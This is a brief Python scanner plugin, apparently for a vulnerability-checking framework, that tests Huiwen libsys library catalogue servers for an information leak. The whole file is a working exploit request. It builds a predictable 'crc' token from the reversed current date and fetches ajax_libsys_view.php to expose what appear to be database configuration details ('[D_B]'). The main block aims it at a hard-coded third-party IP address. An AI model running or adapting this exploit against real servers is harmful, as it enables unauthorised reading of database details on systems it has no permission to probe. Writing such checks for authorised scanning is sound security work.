#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'

def assign(service, arg):
    if service == "libsys":
        return True, arg


def audit(arg):
    import datetime
    crc = datetime.datetime.strftime(datetime.date.today(),'%m%d')
    payload = "opac/ajax_libsys_view.php?code=huiwen_opac&crc=" + crc[::-1]

    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and '[D_B] =>' in res and '<p>' not in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.192.1.40/')[1])
